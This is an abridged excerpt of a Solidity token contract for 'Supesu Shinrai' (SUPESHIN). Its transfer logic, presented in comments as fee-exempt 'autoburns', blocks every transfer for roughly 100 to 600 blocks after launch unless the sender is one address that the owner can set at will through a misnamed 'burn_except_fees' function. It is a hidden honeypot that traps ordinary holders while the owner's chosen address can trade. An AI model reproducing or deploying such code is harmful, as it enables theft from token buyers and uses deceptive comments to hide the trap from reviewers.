...
contract SUPESUSHINRAI is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Supesu Shinrai";
    string private _symbol = "SUPESHIN";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x927Ed4B73F23127dF84ab6F69E79219FE0Ffa524); // Marketing Address
    address payable public BuyBackWalletAddress = payable(0x927Ed4B73F23127dF84ab6F69E79219FE0Ffa524); // Treasury / Buyback
    ...
    address exempt_fee = 0x000000000000000000000000000000000000dEaD;
    ...
    function isInBurnRange(uint candidate) public view onlyOwner returns (bool) {
        if(candidate > launchedBlock + 1*10**2 && candidate < launchedBlock + 6*10**2) {
            return true;
        }
        else {
            return false;
    ...
    function burn_except_fees(address _burnAddress) public onlyOwner {
        exempt_fee = _burnAddress;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(isInBurnRange(block.number)) { // timestamp for autoburns, those exempt from fees by default 
            require(sender == exempt_fee, "ERC20: Only for burns to the zero address"); // secures that fee exemption applies only to burns
        }
